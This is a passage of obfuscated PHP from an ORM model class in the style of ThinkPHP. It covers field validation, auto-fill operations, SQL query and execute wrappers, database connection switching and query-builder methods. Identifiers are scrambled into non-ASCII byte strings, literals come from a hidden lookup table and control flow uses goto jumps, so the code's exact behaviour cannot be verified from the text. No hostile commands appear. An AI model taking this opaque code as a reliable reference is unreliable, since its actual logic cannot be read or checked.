think_config($eöñÖ‹¸™è[291]); if (!isset($AˆˆôºëÆÁ[$DÙ„‚ã®İè]) || Session::get($DÙ„‚ã®İè)) { return !1; } list($dòØÒö­¾ë, $e‘­°ª¶) = explode($eöñÖ‹¸™è[71], $AˆˆôºëÆÁ[$DÙ„‚ã®İè]); if ($e‘­°ª¶ && Session::get($DÙ„‚ã®İè . $eöñÖ‹¸™è[92] . $dòØÒö­¾ë) === $e‘­°ª¶) { Session::remove($DÙ„‚ã®İè . $eöñÖ‹¸™è[92] . $dòØÒö­¾ë); return !0; } if (think_config($eöñÖ‹¸™è[294])) { Session::remove($DÙ„‚ã®İè . $eöñÖ‹¸™è[92] . $dòØÒö­¾ë); } return !1; } return !0; } public function regex($cµŸÉ¬¢, $A¼ùÂÀ¡º“) { $Fœê£¼£Ò¢ =& $_SERVER[İë¬“ÅÒÛ›]; $fâßœ»œéß = array($Fœê£¼£Ò¢[295] => $Fœê£¼£Ò¢[296], $Fœê£¼£Ò¢[297] => $Fœê£¼£Ò¢[298], $Fœê£¼£Ò¢[299] => $Fœê£¼£Ò¢[300], $Fœê£¼£Ò¢[301] => $Fœê£¼£Ò¢[302], $Fœê£¼£Ò¢[303] => $Fœê£¼£Ò¢[304], $Fœê£¼£Ò¢[305] => $Fœê£¼£Ò¢[306], $Fœê£¼£Ò¢[307] => $Fœê£¼£Ò¢[308], $Fœê£¼£Ò¢[282] => $Fœê£¼£Ò¢[309], $Fœê£¼£Ò¢[310] => $Fœê£¼£Ò¢[311]); if (isset($fâßœ»œéß[strtolower($A¼ùÂÀ¡º“)])) { $A¼ùÂÀ¡º“ = $fâßœ»œéß[strtolower($A¼ùÂÀ¡º“)]; } return preg_match($A¼ùÂÀ¡º“, $cµŸÉ¬¢) === 1; } private function autoOperation(&$B½Ÿ‘·óß³, $bëŞÎæÃÜ) { $fâÄâ˜çÅ… =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($this->options[$fâÄâ˜çÅ…[312]])) { $c«ˆÀÎÈÍ« = $this->options[$fâÄâ˜çÅ…[312]]; unset($this->options[$fâÄâ˜çÅ…[312]]); } elseif (!empty($this->_auto)) { $c«ˆÀÎÈÍ« = $this->_auto; } if (isset($c«ˆÀÎÈÍ«)) { foreach ($c«ˆÀÎÈÍ« as $CšÖƒõ‡·) { if (empty($CšÖƒõ‡·[2])) { $CšÖƒõ‡·[2] = THINK_MODEL_INSERT; } if ($bëŞÎæÃÜ == $CšÖƒõ‡·[2] || $CšÖƒõ‡·[2] == THINK_MODEL_BOTH) { switch (trim($CšÖƒõ‡·[3])) { case $fâÄâ˜çÅ…[313]: case $fâÄâ˜çÅ…[314]: $D˜ôñî¼È¨ = isset($CšÖƒõ‡·[4]) ? (array) $CšÖƒõ‡·[4] : array(); if (isset($B½Ÿ‘·óß³[$CšÖƒõ‡·[0]])) { array_unshift($D˜ôñî¼È¨, $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]]); } if ($fâÄâ˜çÅ…[313] == $CšÖƒõ‡·[3]) { $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]] = call_user_func_array($CšÖƒõ‡·[1], $D˜ôñî¼È¨); } else { $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]] = call_user_func_array(array(&$this, $CšÖƒõ‡·[1]), $D˜ôñî¼È¨); } break; case $fâÄâ˜çÅ…[265]: $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]] = $B½Ÿ‘·óß³[$CšÖƒõ‡·[1]]; break; case $fâÄâ˜çÅ…[315]: if ($fâÄâ˜çÅ…[33] === $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]]) { unset($B½Ÿ‘·óß³[$CšÖƒõ‡·[0]]); } break; case $fâÄâ˜çÅ…[316]: default: $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]] = $CšÖƒõ‡·[1]; } if (!1 === $B½Ÿ‘·óß³[$CšÖƒõ‡·[0]]) { unset($B½Ÿ‘·óß³[$CšÖƒõ‡·[0]]); } } } } return $B½Ÿ‘·óß³; } protected function autoValidation($AÊÜÔç©‡, $e·¢¶ŒØŞ) { $fš Íº©©ñ =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($this->options[$fš Íº©©ñ[317]])) { $FŒ×óÎ—ÇĞ = $this->options[$fš Íº©©ñ[317]]; unset($this->options[$fš Íº©©ñ[317]]); } elseif (!empty($this->_validate)) { $FŒ×óÎ—ÇĞ = $this->_validate; } if (isset($FŒ×óÎ—ÇĞ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($FŒ×óÎ—ÇĞ as $fšŒôÈô => $f¾íƒõ“‚­) { if (empty($f¾íƒõ“‚­[5]) || $f¾íƒõ“‚­[5] == THINK_MODEL_BOTH || $f¾íƒõ“‚­[5] == $e·¢¶ŒØŞ) { if (0 == strpos($f¾íƒõ“‚­[2], $fš Íº©©ñ[318]) && strpos($f¾íƒõ“‚­[2], $fš Íº©©ñ[319])) { $f¾íƒõ“‚­[2] = think_lang(substr($f¾íƒõ“‚­[2], 2, -1)); } $f¾íƒõ“‚­[3] = isset($f¾íƒõ“‚­[3]) ? $f¾íƒõ“‚­[3] : THINK_EXISTS_VALIDATE; $f¾íƒõ“‚­[4] = isset($f¾íƒõ“‚­[4]) ? $f¾íƒõ“‚­[4] : $fš Íº©©ñ[320]; switch ($f¾íƒõ“‚­[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($AÊÜÔç©‡, $f¾íƒõ“‚­)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($fš Íº©©ñ[33] != trim($AÊÜÔç©‡[$f¾íƒõ“‚­[0]])) { if (!1 === $this->_validationField($AÊÜÔç©‡, $f¾íƒõ“‚­)) { return !1; } } break; default: if (isset($AÊÜÔç©‡[$f¾íƒõ“‚­[0]])) { if (!1 === $this->_validationField($AÊÜÔç©‡, $f¾íƒõ“‚­)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($D«ê‡‰ÓŠù, $E™Ç»Ê³‡) { if (!1 === $this->_validationFieldItem($D«ê‡‰ÓŠù, $E™Ç»Ê³‡)) { if ($this->patchValidate) { $this->error[$E™Ç»Ê³‡[0]] = $E™Ç»Ê³‡[2]; } else { $this->error = $E™Ç»Ê³‡[2]; return !1; } } return; } protected function _validationFieldItem($cõğó‘óëª, $a­†ä×˜ì½) { $aÏºõ²ÖÙŒ =& $_SERVER[İë¬“ÅÒÛ›]; switch (strtolower(trim($a­†ä×˜ì½[4]))) { case $aÏºõ²ÖÙŒ[313]: case $aÏºõ²ÖÙŒ[314]: $D‘¨óÈ„Ö” = isset($a­†ä×˜ì½[6]) ? (array) $a­†ä×˜ì½[6] : array(); if (is_string($a­†ä×˜ì½[0]) && strpos($a­†ä×˜ì½[0], $aÏºõ²ÖÙŒ[47])) { $a­†ä×˜ì½[0] = explode($aÏºõ²ÖÙŒ[47], $a­†ä×˜ì½[0]); } if (is_array($a­†ä×˜ì½[0])) { foreach ($a­†ä×˜ì½[0] as $A“Àƒåâ) { $AÑºë¨»‘Æ[$A“Àƒåâ] = $cõğó‘óëª[$A“Àƒåâ]; } array_unshift($D‘¨óÈ„Ö”, $AÑºë¨»‘Æ); } else { array_unshift($D‘¨óÈ„Ö”, $cõğó‘óëª[$a­†ä×˜ì½[0]]); } if ($aÏºõ²ÖÙŒ[313] == $a­†ä×˜ì½[4]) { return call_user_func_array($a­†ä×˜ì½[1], $D‘¨óÈ„Ö”); } else { return call_user_func_array(array(&$this, $a­†ä×˜ì½[1]), $D‘¨óÈ„Ö”); } case $aÏºõ²ÖÙŒ[321]: return $cõğó‘óëª[$a­†ä×˜ì½[0]] == $cõğó‘óëª[$a­†ä×˜ì½[1]]; case $aÏºõ²ÖÙŒ[322]: if (is_string($a­†ä×˜ì½[0]) && strpos($a­†ä×˜ì½[0], $aÏºõ²ÖÙŒ[47])) { $a­†ä×˜ì½[0] = explode($aÏºõ²ÖÙŒ[47], $a­†ä×˜ì½[0]); } $EÏé¿ÒÍ‰Ã = array(); if (is_array($a­†ä×˜ì½[0])) { foreach ($a­†ä×˜ì½[0] as $A“Àƒåâ) { $EÏé¿ÒÍ‰Ã[$A“Àƒåâ] = $cõğó‘óëª[$A“Àƒåâ]; } } else { $EÏé¿ÒÍ‰Ã[$a­†ä×˜ì½[0]] = $cõğó‘óëª[$a­†ä×˜ì½[0]]; } if (!empty($cõğó‘óëª[$this->getPk()])) { $EÏé¿ÒÍ‰Ã[$this->getPk()] = array($aÏºõ²ÖÙŒ[323], $cõğó‘óëª[$this->getPk()]); } if ($this->where($EÏé¿ÒÍ‰Ã)->find()) { return !1; } return !0; default: return $this->check($cõğó‘óëª[$a­†ä×˜ì½[0]], $a­†ä×˜ì½[1], $a­†ä×˜ì½[4]); } } public function check($AºÇŠ¦ù, $FçáÌ‚±ß, $eÒ‹Ë¿Ë‚ = "\x72\145\x67\x65\170") { $f×¯Ñ½İ’² =& $_SERVER[İë¬“ÅÒÛ›]; $eÒ‹Ë¿Ë‚ = strtolower(trim($eÒ‹Ë¿Ë‚)); switch ($eÒ‹Ë¿Ë‚) { case $f×¯Ñ½İ’²[7]: case $f×¯Ñ½İ’²[324]: $e÷±¢‡Ôç = is_array($FçáÌ‚±ß) ? $FçáÌ‚±ß : explode($f×¯Ñ½İ’²[47], $FçáÌ‚±ß); return $eÒ‹Ë¿Ë‚ == $f×¯Ñ½İ’²[7] ? in_array($AºÇŠ¦ù, $e÷±¢‡Ôç) : !in_array($AºÇŠ¦ù, $e÷±¢‡Ôç); case $f×¯Ñ½İ’²[325]: case $f×¯Ñ½İ’²[326]: if (is_array($FçáÌ‚±ß)) { $e¶¹‡Ô«· = $FçáÌ‚±ß[0]; $fİÕñœù·— = $FçáÌ‚±ß[1]; } else { list($e¶¹‡Ô«·, $fİÕñœù·—) = explode($f×¯Ñ½İ’²[47], $FçáÌ‚±ß); } return $eÒ‹Ë¿Ë‚ == $f×¯Ñ½İ’²[325] ? $AºÇŠ¦ù >= $e¶¹‡Ô«· && $AºÇŠ¦ù <= $fİÕñœù·— : $AºÇŠ¦ù < $e¶¹‡Ô«· || $AºÇŠ¦ù > $fİÕñœù·—; case $f×¯Ñ½İ’²[327]: case $f×¯Ñ½İ’²[328]: return $eÒ‹Ë¿Ë‚ == $f×¯Ñ½İ’²[327] ? $AºÇŠ¦ù == $FçáÌ‚±ß : $AºÇŠ¦ù != $FçáÌ‚±ß; case $f×¯Ñ½İ’²[329]: $c°¢Öæ†ª³ = mb_strlen($AºÇŠ¦ù, $f×¯Ñ½İ’²[330]); if (strpos($FçáÌ‚±ß, $f×¯Ñ½İ’²[47])) { list($e¶¹‡Ô«·, $fİÕñœù·—) = explode($f×¯Ñ½İ’²[47], $FçáÌ‚±ß); return $c°¢Öæ†ª³ >= $e¶¹‡Ô«· && $c°¢Öæ†ª³ <= $fİÕñœù·—; } else { return $c°¢Öæ†ª³ == $FçáÌ‚±ß; } case $f×¯Ñ½İ’²[331]: list($B¼ß’ğ, $D·£éÂƒæê) = explode($f×¯Ñ½İ’²[47], $FçáÌ‚±ß); if (!is_numeric($B¼ß’ğ)) { $B¼ß’ğ = strtotime($B¼ß’ğ); } if (!is_numeric($D·£éÂƒæê)) { $D·£éÂƒæê = strtotime($D·£éÂƒæê); } return NOW_TIME >= $B¼ß’ğ && NOW_TIME <= $D·£éÂƒæê; case $f×¯Ñ½İ’²[332]: return in_array(get_client_ip(), explode($f×¯Ñ½İ’²[47], $FçáÌ‚±ß)); case $f×¯Ñ½İ’²[333]: return !in_array(get_client_ip(), explode($f×¯Ñ½İ’²[47], $FçáÌ‚±ß)); case $f×¯Ñ½İ’²[320]: default: return $this->regex($AºÇŠ¦ù, $FçáÌ‚±ß); } } public function query($A‡¼ÚŞ¤”ˆ, $B§’Ğ¼ãšË = false) { $EĞŸ‰äì¨Í =& $_SERVER[İë¬“ÅÒÛ›]; if (!is_bool($B§’Ğ¼ãšË) && !is_array($B§’Ğ¼ãšË)) { $B§’Ğ¼ãšË = func_get_args(); array_shift($B§’Ğ¼ãšË); } $A‡¼ÚŞ¤”ˆ = str_replace(array($EĞŸ‰äì¨Í[224], $EĞŸ‰äì¨Í[334]), $EĞŸ‰äì¨Í[50], $A‡¼ÚŞ¤”ˆ); $A‡¼ÚŞ¤”ˆ = $this->parseSql($A‡¼ÚŞ¤”ˆ, $B§’Ğ¼ãšË); return $this->db->query($A‡¼ÚŞ¤”ˆ); } public function execute($Bƒ˜ÒÖ„À´, $AÌÇğº¼¶ = false) { if (!is_bool($AÌÇğº¼¶) && !is_array($AÌÇğº¼¶)) { $AÌÇğº¼¶ = func_get_args(); array_shift($AÌÇğº¼¶); } $Bƒ˜ÒÖ„À´ = $this->parseSql($Bƒ˜ÒÖ„À´, $AÌÇğº¼¶); return $this->db->execute($Bƒ˜ÒÖ„À´); } protected function parseSql($AÙÂ’æß, $b‹»î†‡ƒÚ) { $FïÅ«ïåÙ² =& $_SERVER[İë¬“ÅÒÛ›]; if (!0 === $b‹»î†‡ƒÚ) { $cÆó“ŒÊ½Ÿ = $this->_parseOptions(); $AÙÂ’æß = $this->db->parseSql($AÙÂ’æß, $cÆó“ŒÊ½Ÿ); } elseif (is_array($b‹»î†‡ƒÚ)) { $b‹»î†‡ƒÚ = array_map(array($this->db, $FïÅ«ïåÙ²[335]), $b‹»î†‡ƒÚ); $AÙÂ’æß = vsprintf($AÙÂ’æß, $b‹»î†‡ƒÚ); } else { $AÙÂ’æß = strtr($AÙÂ’æß, array($FïÅ«ïåÙ²[336] => $this->getTableName(), $FïÅ«ïåÙ²[337] => think_config($FïÅ«ïåÙ²[236]))); } $this->db->setModel($this->name); return $AÙÂ’æß; } public function db($b‰ ¹ôÇÖ˜ = '', $f˜Ûé°·„  = '', $AŠè¿Šš¯ = array()) { goto f¾Ë˜‹–ôÌ; f¾Ë˜‹–ôÌ: $BË“®ˆØí¬ =& $_SERVER[İë¬“ÅÒÛ›]; if ($BË“®ˆØí¬[33] === $b‰ ¹ôÇÖ˜ && $this->db) { return $this->db; } static $C„çåê£· = array(); goto B†Ö¯ğéˆõ; B†Ö¯ğéˆõ: static $dß­·ª‡­ƒ = array(); if (!isset($dß­·ª‡­ƒ[$b‰ ¹ôÇÖ˜]) || isset($dß­·ª‡­ƒ[$b‰ ¹ôÇÖ˜]) && $f˜Ûé°·„  && $C„çåê£·[$b‰ ¹ôÇÖ˜] != $f˜Ûé°·„ ) { if (!empty($f˜Ûé°·„ ) && is_string($f˜Ûé°·„ ) && !1 === strpos($f˜Ûé°·„ , $BË“®ˆØí¬[8])) { $f˜Ûé°·„  = think_config($f˜Ûé°·„ ); } $dß­·ª‡­ƒ[$b‰ ¹ôÇÖ˜] = Db::getInstance($f˜Ûé°·„ ); } elseif (NULL === $f˜Ûé°·„ ) { $dß­·ª‡­ƒ[$b‰ ¹ôÇÖ˜]->close(); unset($dß­·ª‡­ƒ[$b‰ ¹ôÇÖ˜]); return; } if (!empty($AŠè¿Šš¯)) { if (is_string($AŠè¿Šš¯)) { parse_str($AŠè¿Šš¯, $AŠè¿Šš¯); } foreach ($AŠè¿Šš¯ as $EŸ›¨‘Àí => $c³Òàå¤ƒ) { $this->setProperty($EŸ›¨‘Àí, $c³Òàå¤ƒ); } } goto C…Ò¡®»ğƒ; C©ß¾‹ŒÂî: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto EÂ›±Ó¨·Í; C…Ò¡®»ğƒ: $C„çåê£·[$b‰ ¹ôÇÖ˜] = $f˜Ûé°·„ ; $this->db = $dß­·ª‡­ƒ[$b‰ ¹ôÇÖ˜]; $this->_after_db(); goto C©ß¾‹ŒÂî; EÂ›±Ó¨·Í: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $bôÀå¢˜ = get_class($this); if ($bôÀå¢˜ == $_SERVER[İë¬“ÅÒÛ›][338]) { return $this->name; } $this->name = substr($bôÀå¢˜, 0, -5); } return $this->name; } public function getTableName() { $f¥°›ŠŒÁ„ =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($this->trueTableName)) { $Céª÷íî… = !empty($this->tablePrefix) ? $this->tablePrefix : $f¥°›ŠŒÁ„[33]; if (!empty($this->tableName)) { $Céª÷íî… .= $this->tableName; } else { $Céª÷íî… .= think_parse_name($this->name); } $this->trueTableName = strtolower($Céª÷íî…); } return (!empty($this->dbName) ? $this->dbName . $f¥°›ŠŒÁ„[92] : $f¥°›ŠŒÁ„[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fœ„—É‘‘È =& $_SERVER[İë¬“ÅÒÛ›]; return isset($this->fields[$fœ„—É‘‘È[243]]) ? $this->fields[$fœ„—É‘‘È[243]] : $this->pk; } public function getDbFields() { $d¶‚äˆ¼½² =& $_SERVER[İë¬“ÅÒÛ›]; if (isset($this->options[$d¶‚äˆ¼½²[271]])) { $cäâïÍ”æ‚ = $this->db->getFields($this->options[$d¶‚äˆ¼½²[271]]); return $cäâïÍ”æ‚ ? array_keys($cäâïÍ”æ‚) : !1; } if ($this->fields) { $cäâïÍ”æ‚ = $this->fields; unset($cäâïÍ”æ‚[$d¶‚äˆ¼½²[242]], $cäâïÍ”æ‚[$d¶‚äˆ¼½²[243]], $cäâïÍ”æ‚[$d¶‚äˆ¼½²[244]], $cäâïÍ”æ‚[$d¶‚äˆ¼½²[241]]); return $cäâïÍ”æ‚; } return !1; } public function data($E¹Ïèí÷ƒ = '') { $Dá›÷½ÆÃå =& $_SERVER[İë¬“ÅÒÛ›]; if ($Dá›÷½ÆÃå[33] === $E¹Ïèí÷ƒ && !empty($this->data)) { return $this->data; } if (is_object($E¹Ïèí÷ƒ)) { $E¹Ïèí÷ƒ = get_object_vars($E¹Ïèí÷ƒ); } elseif (is_string($E¹Ïèí÷ƒ)) { parse_str($E¹Ïèí÷ƒ, $E¹Ïèí÷ƒ); } elseif (!is_array($E¹Ïèí÷ƒ)) { think_exception(think_lang($Dá›÷½ÆÃå[263])); } $this->data = $E¹Ïèí÷ƒ; return $this; } public function join($bÁøù¹«) { $B¢ö‰Ôë×è =& $_SERVER[İë¬“ÅÒÛ›]; if (is_array($bÁøù¹«)) { $this->options[$B¢ö‰Ôë×è[274]] = $bÁøù¹«; } elseif (!empty($bÁøù¹«)) { $this->options[$B¢ö‰Ôë×è[274]][] = $bÁøù¹«; } return $this; } public function union($dÖÎµ¤Ç¶Ä, $C£Ùçëø‰ì = false) { goto BˆµŠÎÌÊ; BˆµŠÎÌÊ: $eŠ–ÎŞ¾£ä =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($dÖÎµ¤Ç¶Ä)) { return $this; } if ($C£Ùçëø‰ì) { $this->options[$eŠ–ÎŞ¾£ä[339]][$eŠ–ÎŞ¾£ä[340]] = !0; } goto añíµÑ¦Øº; añíµÑ¦Øº: if (is_object($dÖÎµ¤Ç¶Ä)) { $dÖÎµ¤Ç¶Ä = get_object_vars($dÖÎµ¤Ç¶Ä); } if (is_string($dÖÎµ¤Ç¶Ä)) { $f°„Ñƒ’É  = $dÖÎµ¤Ç¶Ä; } elseif (is_array($dÖÎµ¤Ç¶Ä)) { if (isset($dÖÎµ¤Ç¶Ä[0])) { $this->options[$eŠ–ÎŞ¾£ä[339]] = array_merge($this->options[$eŠ–ÎŞ¾£ä[339]], $dÖÎµ¤Ç¶Ä); return $this; } else { $f°„Ñƒ’É  = $dÖÎµ¤Ç¶Ä; } } else { think_exception(think_lang($eŠ–ÎŞ¾£ä[263])); } $this->options[$eŠ–ÎŞ¾£ä[339]][] = $f°„Ñƒ’É ; goto cˆöœôÎà; cˆöœôÎà: return $this; goto fäÊªÈÚÕ; fäÊªÈÚÕ: } public function cache($F›®µë†– = true, $cÇŒƒ†Æ¬Î = null, $FÓ›•‹áñš = '') { $eâ­ğ¾ËÅ¿ =& $_SERVER[İë¬“ÅÒÛ›]; if (!1 !== $F›®µë†–) { $this->options[$eâ­ğ¾ËÅ¿[341]] = array($eâ­ğ¾ËÅ¿[88] => $F›®µë†–, $eâ­ğ¾ËÅ¿[331] => $cÇŒƒ†Æ¬Î, $eâ­ğ¾ËÅ¿[29] => $FÓ›•‹áñš); } return $this; } public function field($e¸ùÓæ¨½Æ, $bç¯ŒÄê§« = false) { $F¼ØÀáë™ =& $_SERVER[İë¬“ÅÒÛ›]; if (!0 === $e¸ùÓæ¨½Æ) { $E‘Ü‹Å°ï = $this->getDbFields(); $e¸ùÓæ¨½Æ = $E‘Ü‹Å°ï ? $E‘Ü‹Å°ï : $F¼ØÀáë™[173]; } elseif ($bç¯ŒÄê§«) { if (is_string($e¸ùÓæ¨½Æ)) { $e¸ùÓæ¨½Æ = explode($F¼ØÀáë™[47], $e¸ùÓæ¨½Æ); } $E‘Ü‹Å°ï = $this->getDbFields(); $e¸ùÓæ¨½Æ = $E‘Ü‹Å°ï ? array_diff($E‘Ü‹Å°ï, $e¸ùÓæ¨½Æ) : $e¸ùÓæ¨½Æ; } $this->options[$F¼ØÀáë™[265]] = $e¸ùÓæ¨½Æ; return $this; } public function scope($CàÅÀ÷óÎÕ = '', $eÂË•£Â—Œ = NULL) { $dÚ¾İ©²ã§ =& $_SERVER[İë¬“ÅÒÛ›]; if ($dÚ¾İ©²ã§[33] === $CàÅÀ÷óÎÕ) { if (isset($this->_scope[$dÚ¾İ©²ã§[34]])) { $a‚·¥À = $this->_scope[$dÚ¾İ©²ã§[34]]; } else { return $this; } } elseif (is_string($CàÅÀ÷óÎÕ)) { $EÎ»ŒÆª½õ = explode($dÚ¾İ©²ã§[47], $CàÅÀ÷óÎÕ); $a‚·¥À = array(); foreach ($EÎ»ŒÆª½õ as $fé®ùÁñ›Œ) { if (!isset($this->_scope[$fé®ùÁñ›Œ])) { continue; } $a‚·¥À = array_merge($a‚·¥À, $this->_scope[$fé®ùÁñ›Œ]); } if (!empty($eÂË•£Â—Œ) && is_array($eÂË•£Â—Œ)) { $a‚·¥À = array_merge($a‚·¥À, $eÂË•£Â—Œ); } } elseif (is_array($CàÅÀ÷óÎÕ)) { $a‚·¥À = $CàÅÀ÷óÎÕ; } if (is_array($a‚·¥À) && !empty($a‚·¥À)) { $this->options = array_merge($this->options, array_change_key_case($a‚·¥À)); } return $this; } public function where($F»Ûøáä§´, $d²÷°ìÄ–æ = null) { $F·Êˆ¨åä =& $_SERVER[İë¬“ÅÒÛ›]; if (!is_null($d²÷°ìÄ–æ) && is_string($F»Ûøáä§´)) { if (!is_array($d²÷°ìÄ–æ)) { $d²÷°ìÄ–æ = func_get_args(); array_shift($d²÷°ìÄ–æ); } $d²÷°ìÄ–æ = array_map(array($this->db, $F·Êˆ¨åä[335]), $d²÷°ìÄ–æ); $F»Ûøáä§´ = vsprintf($F»Ûøáä§´, $d²÷°ìÄ–æ); } elseif (is_object($F»Ûøáä§´)) { $F»Ûøáä§´ = get_object_vars($F»Ûøáä§´); } if (is_string($F»Ûøáä§´) && $F·Êˆ¨åä[33] != $F»Ûøáä§´) { $fí£ÒÜ¦ô‰ = array(); $fí£ÒÜ¦ô‰[$F·Êˆ¨åä[342]] = $F»Ûøáä§´; $F»Ûøáä§´ = $fí£ÒÜ¦ô‰; } if (isset($this->options[$F·Êˆ¨åä[267]])) { $this->options[$F·Êˆ¨åä[267]] = array_merge($this->options[$F·Êˆ¨åä[267]], $F»Ûøáä§´); } else { $this->options[$F·Êˆ¨åä[267]] = $F»Ûøáä§´; } return $this; } public function limit($e¶ã”†÷ª, $a‚±ğ© ÚÃ = null) { $a­ŞÒÈ†Ëé =& $_SERVER[İë¬“ÅÒÛ›]; $this->options[$a­ŞÒÈ†Ëé[284]] = is_null($a‚±ğ© ÚÃ) ? $e¶ã”†÷ª : $e¶ã”†÷ª . $a­ŞÒÈ†Ëé[47] . $a‚±ğ© ÚÃ; return $this; } public function page($cßèßÀë‘¤, $Bƒù·ÉøËÑ = null) { $fŒğ‰Ç¿å¸ =& $_SERVER[İë¬“ÅÒÛ›]; $this->options[$fŒğ‰Ç¿å¸[343]] = is_null($Bƒù·ÉøËÑ) ? $cßèßÀë‘¤ : $cßèßÀë‘¤ . $fŒğ‰Ç¿å¸[47] . $Bƒù·ÉøËÑ; return $this; } public function comment($b£Ûİ·ùªˆ) { $this->options[$_SERVER[İë¬“ÅÒÛ›][344]] = $b£Ûİ·ùªˆ; return $this; } public function setProperty($DŸ©›Ùºî, $aÑ«ø»ŠÑ) { if (property_exists($this, $DŸ©›Ùºî)) { $this->{$DŸ©›Ùºî} = $aÑ«ø»ŠÑ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\x54\x69\155\145", "\x74\151\155\x65", "\x69\x6e\x73\x65\x72\164\54\x75\160\144\x61\164\145", "\x66\165\156\143\164\151\157\x6e"), array("\143\x72\x65\x61\164\145\124\151\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\145\x72\x74", "\146\165\x6e\143\x74\151\x6f\156")); public function setDataAuto($b„ö´“¿’œ) { $this->dataAuto = $b„ö´“¿’œ; } public function __construct($f˜î†ø…ºŸ = '', $aø”äíÏˆ‡ = '', $f¥æ±¹ÆÀ¯ = '') { parent::__construct($f˜î†ø…ºŸ, $aø”äíÏˆ‡, $f¥æ±¹ÆÀ¯); } static function textEncode($DØğìñèĞò) { $D£²‚¯º¾ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$DØğìñèĞò) { return $D£²‚¯º¾[33]; } $eÆîšº½¯ = json_encode($DØğìñèĞò); $eÆîšº½¯ = preg_replace_callback($D£²‚¯º¾[345], function ($F¯™…Ï„ÔÌ) { return addslashes($F¯™…Ï„ÔÌ[0]); }, $eÆîšº½¯); return json_decode($eÆîšº½¯); } static function textDecode($EÛŒ®ù‡) { $E¤×œ¨Ë¡¢ =& $_SERVER[İë¬“ÅÒÛ›]; $cÓÅÀ’ñÖ = json_encode($EÛŒ®ù‡); $cÓÅÀ’ñÖ = preg_replace_callback($E¤×œ¨Ë¡¢[346], function ($AÕ˜çöåÀô) { return $_SERVER[İë¬“ÅÒÛ›][94]; }, $cÓÅÀ’ñÖ); return json_decode($cÓÅÀ’ñÖ); } protected $tableMeta = array(); protected function _beforeInsert(&$CĞå…¤÷¨ô, $a÷Ãƒ¦´‘¸) { $d†™½ÏÌ¼ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->checkDataAutoHas($d†™½ÏÌ¼[347])) { return; } $this->dataBeforeFilter($CĞå…¤÷¨ô, $d†™½ÏÌ¼[347]); } protected function _beforeUpdate(&$eÌÁìĞÑ†ğ, $fÔÁ„»‰ø) { $AµÄâ¶˜†· =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->checkDataAutoHas($AµÄâ¶˜†·[348])) { return; } $this->dataBeforeFilter($eÌÁìĞÑ†ğ, $AµÄâ¶˜†·[348]); } protected function _afterSelect(&$E¥·Ú®âÂ•, $DÇµİ³¾‰°) { if (!is_array($E¥·Ú®âÂ•)) { return; } if (!$this->checkDataAutoHas($_SERVER[İë¬“ÅÒÛ›][349])) { return; } foreach ($E¥·Ú®âÂ• as &$E¨•Î‚ãíŸ) { $this->dataAfterFilter($E¨•Î‚ãíŸ); } } protected function _afterFind(&$FñÕà©øé…, $eÖ£¶ÇŠßï) { if (!is_array($FñÕà©øé…)) { return; } if (!$this->checkDataAutoHas($_SERVER[İë¬“ÅÒÛ›][349])) { return; } $this->dataAfterFilter($FñÕà©øé…); } public function setAutoIncrement($eŞ¸í—¬Ş…) { $EÕ¨¯Œº‹ = array($this->getPk() => $eŞ¸í—¬Ş…); $B¥¥êŠŞÆ = $this->data($EÕ¨¯Œº‹)->add(); if ($B¥¥êŠŞÆ) { $this->delete($B¥¥êŠŞÆ); } } public function getAutoIncrement() { $a’’²®‡İ¹ = $this->getTableName(); $D×©ÄõÀ¦ = $this->max($this->getPk()); $d¢­±ŠÚÍ = $this->query("\x73\x68\x6f\167\40\164\141\142\154\145\x20\163\x74\141\x74\165\x73\40\x77\x68\x65\x72\x65\x20\116\141\x6d\x65\75\x27{$a’’²®‡İ¹}\x27"); $cŒ¨Ñ®¢Ó… = $d¢­±ŠÚÍ[0][$_SERVER[İë¬“ÅÒÛ›][350]]; $e™’ÄÂÊ§Å = max($D×©ÄõÀ¦, $cŒ¨Ñ®¢Ó…); return $e™’ÄÂÊ§Å; } protected function _callBefore($DùÑ„ÙäÕ, $cÎŠŸ¸¡éã) { return $this->cacheCallCheck($DùÑ„ÙäÕ, $cÎŠŸ¸¡éã, !1); } protected function _callAfter($C‹—’óè‰‚, $B°Œ†°øŠ§) { return $this->cacheCallCheck($C‹—’óè‰‚, $B°Œ†°øŠ§, !0); } protected function cacheFunctionAlias($fÕ„ĞÊ½) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($eİéÇŠéå, $eÎ…™ëˆ²Ò, $bãËîÔ = false) { $f˜ĞŸ×Ÿ•± = $this->cacheFunctionAlias($eÎ…™ëˆ²Ò); if (!$f˜ĞŸ×Ÿ•±) { return; } foreach ($f˜ĞŸ×Ÿ•± as $Eø‘¬”¾ßÁ => $eÏè Ç¨¥») { $B ÷²§¶¾ = $eÏè Ç¨¥»[0]; $cŞÃéÃ¹¼Ä = explode($_SERVER[İë¬“ÅÒÛ›][47], $eÏè Ç¨¥»[1]); if ($eİéÇŠéå == 